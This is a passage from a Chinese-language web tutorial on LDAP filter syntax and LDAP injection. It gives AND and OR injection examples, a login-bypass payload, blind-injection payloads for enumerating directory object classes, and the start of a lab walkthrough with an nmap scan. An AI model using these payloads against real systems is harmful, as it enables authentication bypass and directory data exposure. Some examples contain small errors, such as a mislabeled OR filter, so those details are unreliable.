style="color:#393A34">(</span><span class="token plain">filter</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="详细解释">详细解释<a href="#详细解释" class="hash-link" aria-label="详细解释的直接链接" title="详细解释的直接链接">​</a></h3>
<ul>
<li><code>=</code>(等于)</li>
</ul>
<p>查找&quot;Name&quot;属性为&quot;John&quot;的所有对象:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(Name=John)</span><br></span></code></pre></div></div>
<p>这条语句会返回&quot;name&quot;为&quot;john&quot;的所有对象，以便强调LDAP语句的开始和结束</p>
<ul>
<li><code>&amp;</code>(逻辑与)</li>
</ul>
<p>如果具有多个条件，并且希望所有条件都能满足，则使用该语法。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(&amp;(Name=John)(live=Dallas))</span><br></span></code></pre></div></div>
<p>以上语句查询居住在Dallas 且 名为John的所有人员</p>
<ul>
<li><code>|</code>(逻辑或)</li>
</ul>
<p>如果具有多个条件，并且希望满足其中一个条件，则使用该语法。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(&amp;(Name=John)(live=Dallas))</span><br></span></code></pre></div></div>
<p>以上语句查询居住在Dallas 或 名为John的所有人员</p>
<ul>
<li><code>!</code>(逻辑非)</li>
</ul>
<p>此操作符用来排除具有特定属性的对象:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(!Name=John)</span><br></span></code></pre></div></div>
<p>查找所有&quot;name&quot;不为&quot;John&quot;的人员</p>
<ul>
<li>通配符 <code>*</code></li>
</ul>
<p>可以用通配符表示值可以等于任何内容</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(title=*)</span><br></span></code></pre></div></div>
<p>查找具有职务头衔的所有人员</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(Name=Jo*)</span><br></span></code></pre></div></div>
<p>查找所有&quot;Name&quot;以&quot;Jo&quot;开头的人员</p>
<p>最后，举一个较复杂的例子:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(&amp;(Name=John)(|(live=Dallas)(live=Austin)))</span><br></span></code></pre></div></div>
<p>查找所有居住在Dallas或Austin，并且名为John的人员</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="ldap注入-1">LDAP注入<a href="#ldap注入-1" class="hash-link" aria-label="LDAP注入的直接链接" title="LDAP注入的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ldap注入原因">LDAP注入原因<a href="#ldap注入原因" class="hash-link" aria-label="LDAP注入原因的直接链接" title="LDAP注入原因的直接链接">​</a></h3>
<p>LDAP注入和SQL注入比较类似，不过没有SQL注入中那么多华丽花哨的东西，要简单一些。二者都是没有对用户输入的合法性进行验证，而是直接将数据发送给服务器进行查询，因此攻击者可以注入任意恶意代码。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ldap注意事项">LDAP注意事项<a href="#ldap注意事项" class="hash-link" aria-label="LDAP注意事项的直接链接" title="LDAP注意事项的直接链接">​</a></h3>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">attribute</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">value</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">injected_filter</span><span class="token punctuation" style="color:#393A34">))</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">second_filter</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<ul>
<li>在OpenLDAP中，第二个过滤器会被忽略，只有第一个会被执行，那么类似上面的这种注入就可以成功的。</li>
<li>而在ADAM中，有两个过滤器的查询是不被允许的，那么这种注入是没什么用的。</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ldap过滤器">LDAP过滤器<a href="#ldap过滤器" class="hash-link" aria-label="LDAP过滤器的直接链接" title="LDAP过滤器的直接链接">​</a></h3>
<p>LDAP 注入的一个重要原因就是过滤器的问题，LDAP 在对目录内容进行搜索的时候，需要过滤器来进行配置</p>
<blockquote>
<p>LDAP过滤器定义于RFC4515中，这些过滤器的结构可概括如下：</p>
</blockquote>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Fileter = (filtercomp)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Filtercomp = and / or / not / item</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">And = &amp; filterlist</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Or = | filterlist</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Not = ! filter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Filterlist = 1*filter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Item = simple / present / substring</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Simple = “=” / “~=” / ”&gt;=” / “&lt;=”</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Present = attr =*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Substring = attr “=” [initial]*[final]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Initial = assertion value</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final = assertion value</span><br></span></code></pre></div></div>
<p>所有过滤器必须置于括号中，只有简化的逻辑操作符<code>(AND、OR、NOT)</code>和关系操作符<code>(=、&gt;=、&lt;=、~=)</code>可用于构造它们。特殊符“*”可用来替换过滤器中的一个或多个字符。</p>
<p>除使用逻辑操作符外，RFC4256还允许使用下面的单独符号作为两个特殊常量：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(&amp;)     -&gt;Absolute TRUE </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(|)     -&gt;Absolute FALSE </span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ldap注入举例">LDAP注入举例<a href="#ldap注入举例" class="hash-link" aria-label="LDAP注入举例的直接链接" title="LDAP注入举例的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="and-ldap注入"><strong>AND</strong> LDAP注入<a href="#and-ldap注入" class="hash-link" aria-label="and-ldap注入的直接链接" title="and-ldap注入的直接链接">​</a></h4>
<p>当后端的代码如下</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">parameter1</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">value1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">parameter2</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">value2</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p>这里value1和value2都会被查询，其中value1和value2是用户可控的，如果过滤不完善，就会存在LDAP注入的可能。</p>
<p>比如一个用户登录的场景，用户输入username和password，应用会构造一个过滤器并发给LDAP服务器进行查询。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">username</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">uname</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">password</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">pwd</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p>当用户输入一个有效的用户名，例如admin，那么就有可能在username字段后面进行注入，从而在不知道密码的情况下进行登陆。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">payload: admin</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">result: </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">username</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">admin</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">))</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">password</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">123</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p>LDAP服务器只会处理第一个过滤器，而第一个过滤器永真，因此绕过了登录框</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="or-ldap注入"><strong>OR</strong> LDAP注入<a href="#or-ldap注入" class="hash-link" aria-label="or-ldap注入的直接链接" title="or-ldap注入的直接链接">​</a></h4>
<p>当后端代码如下：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">|</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">parameter1</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">value1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">parameter2</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">value2</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p>一个典型的OR LDAP注入的场景就是：
假设一个资源管理器允许用户了解系统中可用的资源(打印机、扫描器、存储系统等)。用于展示可用资源的查询为：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">|</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">type</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">Rsc1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">type</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">Rsc2</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p>Rsc1和Rsc2表示系统中不同种类的资源，例如，Rsc1=printer，Rsc2=scanner用于列出系统中所以可用的打印机和扫描器。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">payload: Rsc1 </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> printer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">uid</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">result: </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">|</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">type</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">printer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">uid</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">))</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">type</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">scanner</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p>LDAP服务器会响应所有的打印机和用户对象</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="ldap盲注">LDAP<strong>盲注</strong><a href="#ldap盲注" class="hash-link" aria-label="ldap盲注的直接链接" title="ldap盲注的直接链接">​</a></h4>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="ldap-and盲注">LDAP <strong>AND盲注</strong><a href="#ldap-and盲注" class="hash-link" aria-label="ldap-and盲注的直接链接" title="ldap-and盲注的直接链接">​</a></h5>
<ul>
<li>假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器：</li>
</ul>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectclass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">printer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">type</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">Epson*</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p>使用这个查询，如果有可用的Epson打印机，其图标就会显示给客户端，否则没有图标出现。如果攻击者进行LDAP盲注入攻击<code>*)(objectClass=*))(&amp;(objectClass=void</code>，Web应用会构造如下查询：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectclass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">))</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">type</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">Epson*</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p>仅对第一个过滤器进行处理：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectclass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p>结果是，打印机的图标会一定显示出来，因为该查询永远会有结果，过滤器objectClass=*总是返回一个对象。当图标被显示时响应为真，否则为假。
例如构造如下的注入：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">users</span><span class="token punctuation" style="color:#393A34">))</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">foo</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">type</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">Epson*</span><span class="token punctuation" style="color:#393A34">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">resources</span><span class="token punctuation" style="color:#393A34">))</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">foo</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">type</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">Epson*</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p>这种代码注入的设置允许攻击者推测可能存在于LDAP目录服务中不同对象类的值。当响应Web页面至少包含一个打印机图标时，对象类的值就是存在的，另一方面而言，如果对象类的值不存在或没有对它的访问，就不会有图标出现。</p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="ldap-or盲注">LDAP <strong>OR盲注</strong><a href="#ldap-or盲注" class="hash-link" aria-label="ldap-or盲注的直接链接" title="ldap-or盲注的直接链接">​</a></h5>
<p>这种情况下，用于推测想要的信息的逻辑是相反的，因为使用的是OR逻辑操作符。接下来使用的是同一个例子，OR环境的注入为：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">|</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">void</span><span class="token punctuation" style="color:#393A34">))</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">type</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">Epson*</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p>这个LDAP查询没有从LDAP目录服务获得任何对象，打印机的图标也不会显示给客户端(FALSE)。如果在响应的Web页面中有任何图标，则响应为TRUE。故攻击者可以注入下列LDAP过滤器来收集信息：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">|</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">users</span><span class="token punctuation" style="color:#393A34">))</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">type</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">Epson*</span><span class="token punctuation" style="color:#393A34">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">|</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">resources</span><span class="token punctuation" style="color:#393A34">))</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objectClass</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">type</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">Epson*</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="ldap靶场">LDAP靶场<a href="#ldap靶场" class="hash-link" aria-label="LDAP靶场的直接链接" title="LDAP靶场的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="靶场截图">靶场截图<a href="#靶场截图" class="hash-link" aria-label="靶场截图的直接链接" title="靶场截图的直接链接">​</a></h3>
<p><img decoding="async" loading="lazy" alt="靶场" src="/assets/images/156498867750268396690-80a060e5048443db4440b6cce7a4c872.jpg" width="1243" height="796" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="下载地址">下载地址<a href="#下载地址" class="hash-link" aria-label="下载地址的直接链接" title="下载地址的直接链接">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">链接：https://pan.baidu.com/s/1x50hYn2Q4jIsLHbDnU3CVA </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">提取码：8yej </span><br></span></code></pre></div></div>
<p>此处以 <code>LDAP attacks</code> ==&gt; <code>Example 2</code> 为例</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="利用过程">利用过程<a href="#利用过程" class="hash-link" aria-label="利用过程的直接链接" title="利用过程的直接链接">​</a></h3>
<p>使用<code>nmap</code>扫描，发现开启<code>389</code>端口</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\h&gt;nmap -Pn -p- -sV 192.168.30.144 -n -T4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-05 15:29 ?D1ú±ê×?ê±??</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nmap scan report for 192.168.30.144</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host is up (0.0034s latency).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Not shown: 65532 closed ports</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PORT    STATE SERVICE VERSION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">22/tcp  open  ssh     OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">80/tcp  open  http    Apache httpd 2.2.16 ((Debian))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">389/tcp open  